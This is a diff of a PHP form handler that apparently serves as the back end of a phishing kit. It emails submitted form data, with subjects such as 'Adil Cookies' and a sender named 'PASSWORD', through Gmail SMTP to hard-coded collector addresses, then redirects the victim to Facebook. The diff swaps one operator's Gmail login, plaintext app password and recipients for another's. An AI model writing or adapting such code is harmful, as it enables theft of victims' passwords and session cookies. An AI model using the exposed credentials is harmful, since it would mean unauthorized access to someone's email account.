@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-c1czqz4cd1pfr008-support.vercel.app/");
+header("Location: https://web.facebook.com/me");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -27,31 +27,32 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('roniriyaa@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
+        $mail->setFrom('aliumair0044@gmail.com', 'PK');
+        $mail->addAddress('aliumair0044@gmail.com');
+       $mail->addAddress('alirazanizamani1010@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Adil Cookies';
+        $mail->Subject = 'Ali Raza';
         $mail->Body = $emailBody; // Set the email body using the collected form data
+
 
         // Send email
         $mail->send();
         echo 'Email successfully sent using PHPMailer.';
     } catch (Exception $e) {
-        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
-    }
+          echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+  }
 } else {
     echo "Invalid request!";
 }
